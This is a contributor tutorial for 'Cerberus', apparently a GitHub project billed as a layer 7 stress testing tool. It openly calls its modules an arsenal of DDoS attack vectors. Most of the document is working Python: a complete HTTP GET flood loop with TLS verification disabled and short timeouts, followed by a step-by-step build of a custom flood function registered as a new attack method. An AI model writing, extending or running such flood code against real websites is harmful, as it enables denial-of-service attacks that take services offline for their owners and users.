## Welcome to the arsenal!
Here you can view all "standard" attack methods/vectors, which can be used by anybody. I tried my best, but i just suck at writing tutorials

<br>
If you want to add a new method, its really simple

### - Creating the file
To start, you need to create a file, in `src/methods`

### - Starting on the actual code
All methods follow a simple "module" structure:

1. First, we have the license
```py
'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''
```
<br>

2. After that, we have the imports
```py
import time, requests
from src.core import Core
from src.utils import *
from src.useragent import *
```
<br>

3. And then the actual flood function
```py
def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        try:

            Core.session.get(
                utils().buildblock(url), 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout: # if we get a ReadTimeout error, we count it as sent
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1
```
<br>

4. Here, the method gets added to the global methods "database"
```py
# add the method to the methods dictionary
Core.methods.update({
    'GET': { # name, which will be used for the "-m/--method" argument
        'info': 'HTTP GET flood, with basic customizability', # information about the attack
        'func': flood # function
    }
})
```

### - Creating your own method
1. First, you need to add the license, which all other methods use (i will not show it here, due to the sheer size of the license)
2. After that, import the libraries you need
    - These 2 are REQUIRED, and should be imported at ANY cost:
        - `import time`: needed to calculate the stop time
        - `from src.core import Core`: needed for some core variables
    - For this tutorial we will be using the `requests` library

3. Now, we can begin on the actual DDoS'ing function
    - The function should accept 3 arguments:
        - `attack_id`: the attack id, used for calculating the requests sent, failed and more
        - `url`: the target url
        - `stoptime`: the time at which to stop the loop, and stop attacking
    - Our code should now look something like this:
        ```py
        # bla bla license here

        # our imports
        import time, requests
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
        ```
    
    - After that, we will start on the attack loop:
        ```py
        while time.time() < stoptime and not Core.killattack: # loops until the time is equal to the stoptime, or the Core.killattack flag has been set to True
            if not Core.attackrunning: # not running? just restart the loop
                continue
        ```
    - If we add that to our code, it will look like this:
        ```py
        # bla bla license here

        # our imports
        import time, requests
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue
        ```
    
    - Now, we will start on the request sending
       - It is recommended to use the `Core.session` object, due to it being much faster
       - You can just do `requests.get` or `requests.post`, but it will take a huge hit on the performance
       - For the sake of the small tutorial, we will just be doing `requests.get`

       - start by adding the `requests.get` function, where the url will be the `url` argument passed to the function:
           ```py
           requests.get(url)
           ```
        
    - Now add the page requesting code to our method code:
        ```py
        # bla bla license here

        # our imports
        import time, requests
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                requests.get(url)
        ```
    
    - At last, we will be adding our newly created method to the core list of methods:
        ```py
        Core.methods.update({
            'MYCOOLFLOOD': { # your method name, which will be used for the "-m/--method" argument
                'info': 'Hey, look at this awesome flood i made!', # information about the attack
                'func': attacker # function
            }
        })
        ```
    
4. And done, you have now have a function attack!
    - BUT, its not done yet. Its missing the counters, and the exception handling (very important)

    - Lets start on the exception handling first
        - We can mitigate errors, by wrapping our `requests.get` piece in a `try: except:` statement:
        ```py
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                try:
                    requests.get(url)

                except Exception:
                    pass
        ```
        - Its not recommended to just silently ignore the error, and we want to count the amount of errors aswell
    
    - And now we will add the counters
        - We start by counting the actual requests **sent**
        ```py
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                try:
                    requests.get(url)

                    Core.infodict[attack_id]['req_sent'] += 1 # we increment the counter by one
                except Exception:
                    pass
        ```

        - Like i said earlier, its not recommended to ignore the error
        ```py
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                try:
                    requests.get(url)

                    Core.infodict[attack_id]['req_sent'] += 1
                except Exception:
                    Core.infodict[attack_id]['req_fail'] += 1
        ```
        - Now, the method will calculate the requests that were sent, and the ones that failed
        - We also want to calculate the **total** amount of requests
        ```py
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                try:
                    requests.get(url)

                    Core.infodict[attack_id]['req_sent'] += 1
                except Exception:
                    Core.infodict[attack_id]['req_fail'] += 1

                Core.infodict[attack_id]['req_total'] += 1
        ```
        - Now, our method will count the requests sent, the failed ones and the total count!
    
    - And thats basically it! You now have written a method yourself, worthy of earning a place on the **Cereberus Arsenal**

    - If you wish to share it, just make a `pull` request with the new method included